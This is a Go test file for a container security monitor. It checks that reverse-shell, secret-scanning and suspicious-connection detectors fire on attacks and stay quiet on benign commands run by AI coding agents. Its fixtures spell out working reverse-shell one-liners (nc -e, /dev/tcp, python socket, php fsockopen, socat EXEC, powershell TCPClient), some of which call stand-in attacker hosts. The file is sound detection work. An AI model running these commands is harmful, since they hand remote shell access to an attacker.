package monitor

import (
	"strings"
	"testing"
	"time"
)

func TestDetectReverseShells(t *testing.T) {
	tests := []struct {
		name      string
		processes []Process
		wantCount int
	}{
		{
			name: "detect nc -e reverse shell",
			processes: []Process{
				{PID: 1234, User: "root", Command: "nc -e /bin/bash 192.168.1.100 4444"},
				{PID: 1235, User: "root", Command: "bash"},
			},
			wantCount: 1,
		},
		{
			name: "detect bash tcp redirect",
			processes: []Process{
				{PID: 1234, User: "root", Command: "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"},
			},
			wantCount: 1,
		},
		{
			name: "normal processes",
			processes: []Process{
				{PID: 1234, User: "root", Command: "bash"},
				{PID: 1235, User: "root", Command: "ps aux"},
			},
			wantCount: 0,
		},

		// Issue #842: agent Bash tools wrap commands in a shell-snapshot line and
		// quote code that almost always contains ':' (PATH entries, dict/JSON
		// literals, URLs, log text). A bare-':' network heuristic turned every
		// agent-run interpreter one-liner into a kill-on-sight false positive.
		// These benign commands must NOT be flagged.
		{
			name: "benign python3 -c with PATH colon (issue #842)",
			processes: []Process{
				{PID: 1234, User: "1000", Command: `/bin/bash -c source /home/code/.claude/shell-snapshots/snapshot-bash-1.sh 2>/dev/null || true && export PATH=/usr/local/bin:/usr/bin:/bin && python3 -c "print(2+2)"`},
			},
			wantCount: 0,
		},
		{
			name: "benign python -c with dict literal colon (issue #842)",
			processes: []Process{
				{PID: 1234, User: "1000", Command: `python3 -c import json; print(json.dumps({"ok": True}))`},
			},
			wantCount: 0,
		},
		{
			name: "benign claude launcher echoing python -c in the prompt (issue #842)",
			processes: []Process{
				{PID: 1234, User: "1000", Command: `claude -p run python -c "print('hello: world')" to verify the fix`},
			},
			wantCount: 0,
		},
		{
			name: "benign perl/ruby/php one-liners without network indicators (issue #842)",
			processes: []Process{
				{PID: 1, User: "1000", Command: `perl -e print "time: ", scalar localtime, "\n"`},
				{PID: 2, User: "1000", Command: `ruby -e puts({a: 1, b: 2})`},
				{PID: 3, User: "1000", Command: `php -r echo date("H:i:s");`},
			},
			wantCount: 0,
		},

		// True positives must survive the tightened heuristic: real reverse
		// shells all carry a socket/tcp/udp keyword, an IP, or a
		// host:port endpoint.
		{
			name: "python reverse shell with socket+IP",
			processes: []Process{
				{PID: 1234, User: "1000", Command: `python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444))`},
			},
			wantCount: 1,
		},
		{
			name: "php reverse shell via fsockopen to host:port",
			processes: []Process{
				{PID: 1234, User: "1000", Command: `php -r $s=fsockopen("evil.example.com",4444);exec("/bin/sh -i <&3 >&3 2>&3")`},
			},
			wantCount: 1,
		},
		{
			name: "socat tcp exec reverse shell",
			processes: []Process{
				{PID: 1234, User: "1000", Command: `socat TCP4:1.2.3.4:4444 EXEC:/bin/bash`},
			},
			wantCount: 1,
		},
		{
			// Regression: socat/EXEC: carry no sock/tcp/udp/IP/host:port token,
			// so the network gate would miss them — but they are unambiguous
			// tools and must fire regardless (code-review #842).
			name: "socat exec with no network token stays detected",
			processes: []Process{
				{PID: 1234, User: "1000", Command: `socat EXEC:bash`},
			},
			wantCount: 1,
		},
		// socat SYSTEM: is EXEC:'s twin; with a dotless host, decimal or IPv6
		// address there is no network indicator, so it must be self-sufficient
		// on a socat command line.
		{
			name:      "socat SYSTEM: with dotless hostname",
			processes: []Process{{PID: 1234, User: "1000", Command: `socat OPENSSL:attacker:443 SYSTEM:sh`}},
			wantCount: 1,
		},
		{
			name:      "socat SYSTEM: with decimal IP",
			processes: []Process{{PID: 1234, User: "1000", Command: `socat OPENSSL:3232235777:443 SYSTEM:/bin/sh`}},
			wantCount: 1,
		},
		{
			name:      "socat SYSTEM: with IPv6 address",
			processes: []Process{{PID: 1234, User: "1000", Command: `/usr/bin/socat OPENSSL:[2001:db8::1]:443 SYSTEM:sh`}},
			wantCount: 1,
		},
		{
			name:      "system: without socat is not a reverse shell",
			processes: []Process{{PID: 1234, User: "1000", Command: `kubectl get pods -n kube-system: --watch`}},
			wantCount: 0,
		},
		// Token anchoring stopped "sh -i" from matching inside these shell
		// names, so each must be listed explicitly.
		{name: "csh -i", processes: []Process{{PID: 1, User: "1000", Command: `csh -i`}}, wantCount: 1},
		{name: "tcsh -i", processes: []Process{{PID: 1, User: "1000", Command: `tcsh -i >& /dev/null`}}, wantCount: 1},
		{name: "mksh -i", processes: []Process{{PID: 1, User: "1000", Command: `/bin/mksh -i`}}, wantCount: 1},
		{name: "oksh -i", processes: []Process{{PID: 1, User: "1000", Command: `oksh -i`}}, wantCount: 1},
		{name: "lksh -i", processes: []Process{{PID: 1, User: "1000", Command: `lksh -i`}}, wantCount: 1},
		{name: "posh -i", processes: []Process{{PID: 1, User: "1000", Command: `posh -i`}}, wantCount: 1},
		{name: "yash -i", processes: []Process{{PID: 1, User: "1000", Command: `yash -i`}}, wantCount: 1},
		{name: "rbash -i", processes: []Process{{PID: 1, User: "1000", Command: `rbash -i`}}, wantCount: 1},
		{
			name: "nc -e with hostname (no dotted IP) stays detected",
			processes: []Process{
				{PID: 1234, User: "1000", Command: `nc -e /bin/bash evilhost 4444`},
			},
			wantCount: 1,
		},
		{
			name: "interactive bash shell flagged regardless of network indicator",
			processes: []Process{
				{PID: 1234, User: "1000", Command: `bash -i`},
			},
			wantCount: 1,
		},
		// Benign agent commands that only mention a tool name or contain a
		// pattern glued inside another word. Each was a CRITICAL match, which
		// auto-kills the container under the default auto_kill_on_critical.
		{
			name: "installing or locating socat is not a reverse shell",
			processes: []Process{
				{PID: 1, User: "1000", Command: `sudo apt-get install -y socat`},
				{PID: 2, User: "1000", Command: `which socat`},
			},
			wantCount: 0,
		},
		{
			name: "searching for powershell is not a reverse shell",
			processes: []Process{
				{PID: 1, User: "1000", Command: `rg -i powershell docs/`},
			},
			wantCount: 0,
		},
		{
			name: "rsync -e does not match nc -e",
			processes: []Process{
				{PID: 1, User: "1000", Command: `rsync -e ssh ./a ./b`},
			},
			wantCount: 0,
		},
		{
			name: "ssh -i does not match sh -i",
			processes: []Process{
				{PID: 1, User: "1000", Command: `ssh -i /home/code/.ssh/deploy_key git@github.com`},
			},
			wantCount: 0,
		},
		// The real attack forms of those patterns stay detected.
		{
			name: "netcat and sh by absolute path stay detected",
			processes: []Process{
				{PID: 1, User: "1000", Command: `/usr/bin/nc -e /bin/sh evilhost 4444`},
				{PID: 2, User: "1000", Command: `/bin/sh -i`},
			},
			wantCount: 2,
		},
		{
			name: "other interactive shells keep matching after token anchoring",
			processes: []Process{
				{PID: 1, User: "1000", Command: `zsh -i`},
				{PID: 2, User: "1000", Command: `/bin/dash -i`},
				{PID: 3, User: "1000", Command: `ksh -i`},
				{PID: 4, User: "1000", Command: `/bin/ash -i`},
				{PID: 5, User: "1000", Command: `fish -i`},
			},
			wantCount: 5,
		},
		{
			name: "powershell TCP reverse shell stays detected",
			processes: []Process{
				{PID: 1, User: "1000", Command: `powershell -nop -c $c=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)`},
			},
			wantCount: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			threats := DetectReverseShells(tt.processes)
			if len(threats) != tt.wantCount {
				t.Errorf("DetectReverseShells() got %d threats, want %d", len(threats), tt.wantCount)
			}
		})
	}
}

// snapshotWith builds a minimal MonitorSnapshot carrying a single process with
// the given command line, so Analyze() runs the reverse-shell path over it.
func snapshotWith(command string) MonitorSnapshot {
	return MonitorSnapshot{
		Timestamp: time.Unix(0, 0),
		Processes: ProcessStats{
			Available: true,
			Processes: []Process{{PID: 4242, User: "1000", Command: command}},
		},
	}
}

func reverseShellThreats(threats []ThreatEvent) []ThreatEvent {
	var out []ThreatEvent
	for _, t := range threats {
		if t.Category == "process" && t.Title == "Reverse shell detected" {
			out = append(out, t)
		}
	}
	return out
}

// TestReverseShellOneLinerPolicy verifies the #842 knob: the interpreter
// one-liner class (python -c, perl -e, ...) can be downgraded/disabled, while
// the unambiguous class (nc -e, /dev/tcp/, ...) always stays critical.
func TestReverseShellOneLinerPolicy(t *testing.T) {
	// A PURE interpreter one-liner: matches `python3 -c` and carries a network
	// indicator (a host:port endpoint) but NO unambiguous socket indicator, so
	// it is genuinely the downgradeable one-liner class.
	oneLinerCmd := `python3 -c __import__('pty').spawn('/bin/bash') # 10.0.0.1:4444`
	// An unambiguous reverse shell — must stay critical under every policy.
	strongCmd := `nc -e /bin/bash 192.168.1.100 4444`
	// A one-liner that ALSO carries an unambiguous indicator (socket.socket).
	// The knob must NEVER downgrade this: the strong class wins over the
	// co-occurring one-liner match (code-review #842).
	mixedCmd := `python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444))`

	tests := []struct {
		policy       string
		wantOneLiner ThreatLevel // "" means "no event emitted"
	}{
		{"critical", ThreatLevelCritical},
		{"", ThreatLevelCritical},         // empty → safe default
		{"CRITICAL", ThreatLevelCritical}, // case-insensitive
		{"bogus", ThreatLevelCritical},    // unknown → safe default
		{"warn", ThreatLevelWarning},
		{"off", ""},
	}

	for _, tt := range tests {
		t.Run("policy="+tt.policy, func(t *testing.T) {
			d := NewDetector(0, 0).WithReverseShellOneLinerPolicy(tt.policy)

			// Pure one-liner class: follows the policy.
			got := reverseShellThreats(d.Analyze(snapshotWith(oneLinerCmd)))
			if tt.wantOneLiner == "" {
				if len(got) != 0 {
					t.Errorf("policy %q: expected one-liner suppressed, got %d events (level %q)",
						tt.policy, len(got), got[0].Level)
				}
			} else {
				if len(got) != 1 {
					t.Fatalf("policy %q: expected 1 one-liner event, got %d", tt.policy, len(got))
				}
				if got[0].Level != tt.wantOneLiner {
					t.Errorf("policy %q: one-liner level = %q, want %q", tt.policy, got[0].Level, tt.wantOneLiner)
				}
			}

			// Strong class is never affected by the knob.
			strong := reverseShellThreats(d.Analyze(snapshotWith(strongCmd)))
			if len(strong) != 1 || strong[0].Level != ThreatLevelCritical {
				t.Errorf("policy %q: unambiguous reverse shell must stay CRITICAL, got %+v", tt.policy, strong)
			}

			// A one-liner that also carries a strong indicator must stay CRITICAL
			// under EVERY policy — the knob must not open a blind spot for a real
			// reverse shell that happens to invoke an interpreter.
			mixed := reverseShellThreats(d.Analyze(snapshotWith(mixedCmd)))
			if len(mixed) != 1 || mixed[0].Level != ThreatLevelCritical {
				t.Errorf("policy %q: one-liner carrying socket.socket must stay CRITICAL, got %+v", tt.policy, mixed)
			}
			if len(mixed) == 1 && mixed[0].Evidence.Process.Class != ReverseShellClassStrong {
				t.Errorf("policy %q: mixed command should be classified STRONG, got class %q",
					tt.policy, mixed[0].Evidence.Process.Class)
			}
		})
	}
}

func TestIsNetworkRelated(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want bool
	}{
		// Benign colons that previously tripped the bare-':' check (issue #842).
		{"PATH separator", `export path=/usr/local/bin:/usr/bin:/bin && python3 -c print(1)`, false},
		{"json/dict literal", `python3 -c print({"ok": true})`, false},
		{"log-style colon", `python3 -c print("hello: world")`, false},
		{"time literal", `php -r echo date("h:i:s");`, false},
		// Genuine network indicators.
		{"socket keyword", `python3 -c import socket`, true},
		{"tcp keyword", `socat tcp4:host:4444 exec:/bin/sh`, true},
		{"udp keyword", `nc -u 1.2.3.4 53`, true},
		// A bare "connect" with no socket keyword / IP / host:port is NOT a
		// network indicator — flagging it re-opened #842 for db.connect() etc.
		{"bare connect no endpoint", `python3 -c engine.connect()`, false},
		{"connect with host:port", `python3 -c x("evil.example.com:4444")`, true},
		{"bare ipv4", `nc -e /bin/bash 192.168.1.100 4444`, true},
		{"ipv4 host:port", `bash -i >& /dev/tcp/10.0.0.1/4444`, true},
		{"dotted hostname:port", `curl evil.example.com:4444`, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isNetworkRelated(strings.ToLower(tt.cmd)); got != tt.want {
				t.Errorf("isNetworkRelated(%q) = %v, want %v", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestDetectEnvScanning(t *testing.T) {
	tests := []struct {
		name      string
		processes []Process
		wantCount int
	}{
		{
			name: "detect env command",
			processes: []Process{
				{PID: 1234, User: "root", Command: "env", EnvAccess: true},
			},
			wantCount: 1,
		},
		{
			name: "detect grep for secrets",
			processes: []Process{
				{PID: 1234, User: "root", Command: "grep -r API_KEY", EnvAccess: true},
			},
			wantCount: 1,
		},
		{
			name: "normal processes",
			processes: []Process{
				{PID: 1234, User: "root", Command: "bash", EnvAccess: false},
			},
			wantCount: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			threats := DetectEnvScanning(tt.processes)
			if len(threats) != tt.wantCount {
				t.Errorf("DetectEnvScanning() got %d threats, want %d", len(threats), tt.wantCount)
			}
		})
	}
}

func TestCheckSuspicious(t *testing.T) {
	tests := []struct {
		name         string
		conn         Connection
		allowedCIDRs []string
		wantReason   string
	}{
		{
			name: "RFC1918 private address with network restrictions",
			conn: Connection{
				LocalAddr:  "10.47.62.50:12345",
				RemoteAddr: "192.168.1.100:4444",
				State:      "ESTABLISHED",
			},
			allowedCIDRs: []string{"8.8.8.8/32"}, // Network restricted - RFC1918 should be flagged
			wantReason:   "RFC1918 private address",
		},
		{
			name: "suspicious port on public IP",
			conn: Connection{
				LocalAddr:  "10.47.62.50:12345",
				RemoteAddr: "203.0.113.1:4444",
				State:      "ESTABLISHED",
			},
			allowedCIDRs: []string{},
			wantReason:   "Suspicious port: 4444",
		},
		{
			name: "metadata endpoint",
			conn: Connection{
				LocalAddr:  "10.47.62.50:12345",
				RemoteAddr: "169.254.169.254:80",
				State:      "ESTABLISHED",
			},
			allowedCIDRs: []string{},
			wantReason:   "Cloud metadata endpoint access",
		},
		{
			name: "normal connection",
			conn: Connection{
				LocalAddr:  "10.47.62.50:12345",
				RemoteAddr: "52.84.142.12:443",
				State:      "ESTABLISHED",
			},
			allowedCIDRs: []string{},
			wantReason:   "",
		},
		{
			name: "listen socket",
			conn: Connection{
				LocalAddr:  "0.0.0.0:22",
				RemoteAddr: "0.0.0.0:0",
				State:      "LISTEN",
			},
			allowedCIDRs: []string{},
			wantReason:   "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			reason := checkSuspicious(tt.conn, tt.allowedCIDRs)
			if (reason != "") != (tt.wantReason != "") {
				t.Errorf("checkSuspicious() reason = %q, want %q", reason, tt.wantReason)
			}
			if tt.wantReason != "" && !strings.Contains(reason, tt.wantReason) {
				t.Errorf("checkSuspicious() reason = %q, want to contain %q", reason, tt.wantReason)
			}
		})
	}
}

func TestDetectLargeReads(t *testing.T) {
	tests := []struct {
		name       string
		stats      FilesystemStats
		threshold  float64
		wantThreat bool
	}{
		{
			name: "large read exceeds threshold",
			stats: FilesystemStats{
				Available:        true,
				TotalReadMB:      100.0,
				ReadRateMBPerSec: 50.0,
			},
			threshold:  50.0,
			wantThreat: true,
		},
		{
			name: "normal read below threshold",
			stats: FilesystemStats{
				Available:        true,
				TotalReadMB:      10.0,
				ReadRateMBPerSec: 5.0,
			},
			threshold:  50.0,
			wantThreat: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			threat := DetectLargeReads(tt.stats, tt.threshold, 0)
			if (threat != nil) != tt.wantThreat {
				t.Errorf("DetectLargeReads() threat = %v, want threat = %v", threat != nil, tt.wantThreat)
			}
		})
	}
}

func TestDetectLargeWrites(t *testing.T) {
	tests := []struct {
		name          string
		stats         FilesystemStats
		threshold     float64
		rateThreshold float64
		wantThreat    bool
	}{
		{
			name: "large write exceeds threshold",
			stats: FilesystemStats{
				Available:         true,
				TotalWriteMB:      100.0,
				WriteRateMBPerSec: 50.0,
			},
			threshold:     50.0,
			rateThreshold: 0,
			wantThreat:    true,
		},
		{
			name: "normal write below threshold",
			stats: FilesystemStats{
				Available:         true,
				TotalWriteMB:      10.0,
				WriteRateMBPerSec: 5.0,
			},
			threshold:     50.0,
			rateThreshold: 0,
			wantThreat:    false,
		},
		{
			name: "write rate exceeds threshold",
			stats: FilesystemStats{
				Available:         true,
				TotalWriteMB:      10.0,
				WriteRateMBPerSec: 100.0,
			},
			threshold:     50.0,
			rateThreshold: 50.0,
			wantThreat:    true,
		},
		{
			name: "write rate below threshold",
			stats: FilesystemStats{
				Available:         true,
				TotalWriteMB:      10.0,
				WriteRateMBPerSec: 10.0,
			},
			threshold:     50.0,
			rateThreshold: 50.0,
			wantThreat:    false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			threat := DetectLargeWrites(tt.stats, tt.threshold, tt.rateThreshold)
			if (threat != nil) != tt.wantThreat {
				t.Errorf("DetectLargeWrites() threat = %v, want threat = %v", threat != nil, tt.wantThreat)
			}
		})
	}
}

func TestDetectorAnalyzeWriteThreats(t *testing.T) {
	// Test that Analyze() detects large writes
	detector := NewDetector(50.0, 0)

	snapshot := MonitorSnapshot{
		Filesystem: FilesystemStats{
			Available:         true,
			TotalWriteMB:      100.0,
			WriteRateMBPerSec: 50.0,
		},
	}

	threats := detector.Analyze(snapshot)

	// Should find a write threat
	var foundWriteThreat bool
	for _, threat := range threats {
		if threat.Category == "filesystem" && strings.Contains(threat.Title, "write") {
			foundWriteThreat = true
			break
		}
	}

	if !foundWriteThreat {
		t.Error("Analyze() should detect large write threat")
	}
}
